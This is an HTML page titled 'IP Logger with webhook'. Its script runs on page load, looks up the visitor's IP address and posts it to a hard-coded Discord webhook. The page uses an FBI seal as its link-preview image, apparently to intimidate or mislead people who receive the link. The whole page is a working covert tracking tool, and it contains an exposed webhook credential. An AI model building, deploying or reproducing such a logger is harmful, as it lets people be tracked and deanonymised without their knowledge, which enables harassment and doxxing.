<head>
  <meta charset="UTF-8" />
  <title>IP Logger with webhook</title>
  <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
  <meta property="og:url" content="https://kokotzkanala.github.io/TBO-2.0-Ui/" />
  <meta property="og:type" content="website" />
</head>
<body>
  <h1>IP Logger</h1>
  <script>
    (() => {
      const w = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
      fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(d => {
          const i = d.ip;
          console.log("Visitor IP:", i);
          fetch(w, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: `New visitor with recorded IP: ${i}` }),
          })
            .then(res => {
              if (res.ok) console.log("IP sent to webhook");
              else console.error("Error sending to webhook");
            })
            .catch(console.error);
        })
        .catch(console.error);
    })();
  </script>
</body>
